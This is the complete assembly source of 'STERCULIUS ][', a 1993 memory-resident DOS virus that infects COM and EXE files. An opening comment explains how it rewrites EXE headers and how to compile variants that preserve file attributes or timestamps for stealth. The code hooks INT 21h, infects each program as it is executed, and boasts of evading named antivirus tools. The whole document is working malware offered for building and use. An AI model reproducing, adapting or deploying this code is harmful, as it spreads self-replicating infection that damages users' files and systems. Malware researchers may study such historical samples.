comment $

			       STERCULIUS ][ VIRUS


	This is an 'upgrade build' of CRYPT #18's STERCULIUS virus.
	I have made some changes, in particular STERCULIUS ][ now infects
	EXE files as well as COM files.

	The procedure to infect EXE files is rather simple:

	Sterculius installs itself and its INT 21h handler in the memory
	'hole' located after the interrupt vector table (reference:
	CRYPT #18). The INT 21h handler checks when a file is executed;
	then it opens it and determines whether it is a COM or an EXE
	file by checking for a 'MZ' or 'ZM' at the beginning of the file.

	After the nature of the file has been determined, the virus proceeds
	to read to EXE header and to modify the entry point field (CS:IP)
	and the size of the load module/file (how many bytes get loaded from
	the file to memory) on the header.

	Then, infection takes place and the new EXE header is written to
	the file.

	Note that no change is made to the stack segment and the offset of
	the original EXE infected file (SS:SP); in other words the virus
	does not have its own stack segment and offset. I considered this
	to be unnecessary since all well written EXE programs have a stack
	segment (SS) far up in memory from the code segment (CS). The
	danger of the virus corrupting itself when using the stack is
	non-existent, considering the size of the virus and the fact that
	on the installation part of STERCULIUS ][ the stack is barely used.

	The challenge when writing this 'upgrade' was to keep the code small
	enough so it would work properly not corrupt the BIOS data
	loaded by IO.SYS / IBMIO.SYS at segment 0040.

	Some original features of STERCULIUS have been commented out, to
	downsize the code, but in most cases the virus will work perfectly
	if they are included. 

	Here is how to make you own STERCULIUS ][ variant:

	Variant 1:
		  Uncomment (take out the ';' before the instructions)
		  in the following labeled parts:

		  Save Attributes
		  Restore Attributes

		  Compile and link.

	Variant 2:
		  Uncomment the following labeled parts:

		  Save Date and time
		  Restore Date and Time

		  Compile and link.

	Variant 3:
		  Uncomment the following labeled parts:

		  Save Date and time
		  Restore Date and Time

		  Save Attributes
		  Restore Attributes

		  Compile and link.


	K”hntark.

$


;*****************************************************************************
;          STERCULIUS ][ VIRUS
;
; AUTHOR:  K”hntark 
; DATE:    SEPTEMBER 1993
; Memory Resident COM, EXE infector
;
; Success:  F-prot 2.09D - VIRSTOP
;           VIREX 2.8
;           MSAV - will give warning, if 'continue' is pressed the
;                  all infections will go undetected
;           -D   -will install but -D will regain control of the INT 21
;           TBMEM 6.05 - will crash as it installs some instructions in the
;                        middle of the hole where Sterculius ][ resides
;
;
;*****************************************************************************

.model tiny
.code
		org 100h

START:                                                 
		db      0E9h,03,00,'S'   ;Jump to Virus_Entry / infection ID

FAKE_HOST:                                
		int     20h              ;host file terminate

;-----------------------------------------------------------------------------
VIRUS_ENTRY:

		call    INITIALIZE

F_NAME:         db      'STERCULIUS ]['      ;The Roman god of feces

INITIALIZE:
		pop     si
		sub     si,3
		
		push    es                   ;save original ES
		push    ds                   ;save original DS
		
		push    cs                   ;fix DS and ES
		push    cs
		pop     es                   ;ES=CS
		pop     ds                   ;DS=CS
		mov     bp,si                ;save si

		cmp     WORD PTR [si + EXE_FLAG - VIRUS_ENTRY],00
		jne     EXE_SKIP

;*****************                
; Restore host
;*****************
		
		cld
		lea     si,[si + HOST_STUB - VIRUS_ENTRY]
		mov     di,0100h
		movsw             ;from ds:si to es:di
		movsw
		mov     si,bp     ;restore si

EXE_SKIP:

;***************************                
; Check if already resident
;***************************

		xor     ax,ax          ;AX=00
		mov     es,ax          ;ES=00
		mov     di,01E0h
		cmp     WORD PTR es:[di + 3],'TS'
		je      EXIT

		mov     cx,ZIZE
		rep     movsb           ;move virus to 0000:01E0 from ds:si to es:di
		
;***********************                
; Mov INT 21 address
;***********************
		
		sub     di,08        ;position destination pointer at REAL_INT_21
		mov     si,21h * 4
		mov     ds,ax        ;ds=0
		movsw                ;from ds:si to es:di
		movsw 
		
;***********************                
;  Hook INT 21
;***********************

		mov     di,01E0h + OFFSET INT_21_HANDLER - OFFSET VIRUS_ENTRY
		cli                           ;disable interrupts
		mov     WORD PTR [si - 4],di  ;address of INT 21 handler
		mov     WORD PTR [si - 2],ax  
		sti                           ;enable interrupts  

EXIT:
		pop     ds                   ;restore original ES
		pop     es                   ;restore original ES      

		cmp     WORD PTR cs:[bp + EXE_FLAG - VIRUS_ENTRY],00
		jne     EXE_RETURN

		mov     ax,0100h
		push    ax
		ret                 ;return to host

EXE_RETURN:
		mov    bx,ds
		add    bx,low 10h
		mov    cx,bx

		add    cx,WORD PTR cs:[bp + CSIP - VIRUS_ENTRY + 2]
		push   cx
		push   WORD PTR cs:[bp + CSIP - VIRUS_ENTRY]
		db     0CBh                                   ;retf

;----------------------------------------------------------------------------

CSIP:
		dd      0
EXE_FLAG:       
		dw      0

NEW_HOST_ENTRY:
		db      0E9h,00,00,'S'

INT_21:
		pushf  
		call  DWORD PTR cs:[REALL_INT_21]
		ret
		 
QUICK_EXIT:         jmp     QUICK_OUT
RESTORE_ATTRIBUTES: jmp     RESTORE_ATTRIBUTESS
CLOSE_FILE:         jmp     CLOSE_FILEE

;----------------------------------------------------------------------------
INT_21_HANDLER:

		 cmp     ah,4Bh           ;execute a file?
		 jne     QUICK_EXIT       ;quick exit handler
		 
		 push ax
		 push bx
		 push cx
		 push dx
		 push ds
		 push es
		 push si
		 push di
		 push bp
		 pushf

		 push    cs 
		 pop     es                   ;ES=CS

;***********************                
;  1-Save Attributes
;***********************

		; mov     ax,4300h
		; call    INT_21
		; push    cx         ;save attributes to stack
		; push    ds
		; push    dx         ;ds:dx = pathname to file

;***********************                
;  2-Klear Attributes
;***********************

		 xor     cx,cx
		 mov     ax,4301h
		 call    INT_21
		 jc      QUICK_EXIT

;***********************                
;  3-Open File
;***********************

		 mov     ax,3D02h
		 call    INT_21
		 jc      RESTORE_ATTRIBUTES
		 xchg    bx,ax         ;file handle to bx

;***********************                
;  4-Save Date & time
;***********************
		 
		 ;mov   ax,5700h
		 ;call  INT_21
		 ;push  dx              ;save date
		 ;push  cx              ;save time

;********************************
;  5-Read 26 bytes / EXE header
;********************************

		mov     cx,26d               ;# of bytes to read
		mov     dx,HOST_STUBB        ;buffer to read 4 / 26 bytes to
		mov     si,dx
		push    cs
		pop     ds                   ;ds=cs

		mov     ah,3Fh
		call    INT_21               ;read to ds:dx
		jc      CLOSE_FILE

;***********************                
;  6-Check File
;***********************

		cmp     WORD PTR [si],'ZM'     ;EXE file?
		je      CHECK_EXE
		cmp     WORD PTR [si],'MZ'     ;EXE file?
		je      CHECK_EXE
		cmp     BYTE PTR [si + 3],'S'  ;infected COM file?
		je      CLOSE_FILE

		mov     di,OFFSET EXE_FLAGG    ;mark COM infection
		mov     WORD PTR [di],00  ;COM
		xor     di,di
		jmp     short SKIP
		
;***********************                
;  7-Check EXE
;***********************

CHECK_EXE:
		cmp     WORD PTR [si + 12h],ID  ;infected EXE?
		je      CLOSE_FILE
		cmp     WORD PTR [si + 18h],40h ;WINDOWS EXE?
		je      CLOSE_FILE

;                cmp     WORD PTR [si + 1Ah],00  ;internal overlay EXE?
;                jne     CLOSE_FILE

		mov     di,EXE_FLAGG      ;MARK EXE infection
		mov     WORD PTR [di],01  ;EXE
		mov     di,01

SKIP:

;***********************                
;  8-File PTR @EOF
;***********************
		
		mov     ax,4202h
		xor     cx,cx
		xor     dx,dx              ;cx = dx = 00
		call    INT_21

		cmp     di,00    ;COM?
		jne     DO_EXE

;------------------------------------------------------???????????????????
		
		sub     ax,03     ;fix file size 
		mov     bp,ax     ;address to jump to
		
		jmp     short WRITE_VIRUS

;***********************                
;  9-SAVE CS:IP
;***********************

DO_EXE:
		
		push     bx       ;save file handle
		push     si
		push     di
		cld
		mov      di,CSIPP
		add      si,14h         ;CS:IP in EXE hdr
		movsw                   ;from ds:si
		movsw                   ;to   es:di
		pop      di
		pop      si

;**********************************                
;  10-CALCULATE / INSERT NEW CS:IP
;**********************************

		mov      bx,WORD PTR [si + 8] ;header size in paragraphs
		mov      cl,04
		shl      bx,cl                ;multiply by 16

		push     ax
		push     dx                   ;save filesize

		sub      ax,bx                ;file size - header size
		sbb      dx,00                ;fix upper half of size

		mov      cl,0Ch
		shl      dx,cl                ;dx * 4096
		mov      bx,ax
		mov      cl,4
		shr      bx,cl                ;ax / 16
		add      dx,bx                ;CS = dx * 4096 + ax / 16
		and      ax,0Fh               ;IP = ax and 0Fh

		mov      WORD PTR [si + 12h],ID 
		mov      WORD PTR [si + 14h],ax ;IP
		mov      WORD PTR [si + 16h],dx ;CS

		pop      dx
		pop      ax                   ;restore filesize

;**********************************                
;  11-CALCULATE / INSERT FILESIZE
;**********************************
		
		add      ax,ZIZE  ;add virus size
		adc      dx,00    ;add virus size

		push     ax
		mov      cl,09h   ;2^9 = 512
		ror      dx,cl    ;dx / 512
		shr      ax,cl    ;ax / 512
		stc               ;set carry flag
		adc      dx,ax
						  pop      cx       ;original ax
		and      ch,01    ;mod 512

		mov      WORD PTR [si + 4],dx ;page count
		mov      WORD PTR [si + 2],cx ;remainder

		pop      bx                    ;restore file handle

;***********************                
;  12-Write Virus
;***********************

WRITE_VIRUS:

	       mov     ah,40h
	       mov     cx,ZIZE    ;cx = #of bytes
	       mov     dx,01E0h   ;dx = write from here
	       call    INT_21

;***********************                
;  13-Set PTR @BOF
;***********************
		
	       mov     ax,4200h  
	       xor     cx,cx
	       xor     dx,dx               ;cx = dx = 00
	       call    INT_21

	       cmp     di,01     ;EXE?
	       je      WRITE_EXE_HDR

;***********************                
;  14-Write new jump
;***********************

	       mov     cx,4                      ;# of bytes to write
	       mov     dx,NEW_HOST_ENTRYY        ;dx = write from here
	       mov     si,dx
	       mov     WORD PTR [si + 1],bp      ;insert new address
	       jmp     short CONT 

;***********************                
;  15-Write new EXE hdr
;***********************
 
WRITE_EXE_HDR:                
	       mov     cx,24d               ;# of bytes to write
	       mov     dx,HOST_STUBB        ;buffer to write 4 bytes from
	       
CONT:               
	       mov     ah,40h
	       call    INT_21

CLOSE_FILEE:  
		
;*************************                
;  16-Restore Date & time
;*************************
		 
	       ;pop   cx       ;restore time
	       ;pop   dx       ;restore date
	       ;mov   ax,5701h
	       ;call  INT_21

;***********************                
;  17-Klose File
;***********************
	       
	       mov     ah,3Eh 
	       call    INT_21
		 
;************************                
;  18-Restore Attributes
;************************

RESTORE_ATTRIBUTESS:
	       
	      ; mov     ax,4301h
	      ; pop     dx         ;ds:dx = pathname to file
	      ; pop     ds         ;restore pathname
	      ; pop     cx         ;restore old attributes
	      ; call    INT_21

;***********************                
;  Restore registers
;***********************

EXIT_HANDLER:                   
		 popf
		 pop  bp
		 pop  di
		 pop  si
		 pop  es
		 pop  ds
		 pop  dx
		 pop  cx
		 pop  bx
		 pop  ax
		
QUICK_OUT:       db   0EAh                      ; jmp OFFSET:SEGMENT
REAL_INT_21:     db   00,00,00,00
HOST_STUB:       db   90h,090h,090h,090h        ;4 byte COM stub / EXE HDR  
		   
END_VIRUS:                

;-----------------------------------------------------------------------------

ZIZE             equ     OFFSET END_VIRUS              - VIRUS_ENTRY 
REALL_INT_21     equ     01E0h + OFFSET REAL_INT_21    - OFFSET VIRUS_ENTRY
HOST_STUBB       equ     01E0h + OFFSET HOST_STUB      - OFFSET VIRUS_ENTRY     
NEW_HOST_ENTRYY  equ     01E0h + OFFSET NEW_HOST_ENTRY - OFFSET VIRUS_ENTRY
CSIPP            equ     01E0h + OFFSET CSIP           - OFFSET VIRUS_ENTRY
EXE_FLAGG        equ     01E0h + OFFSET EXE_FLAG       - OFFSET VIRUS_ENTRY
ID               equ     7777h

END             START
		

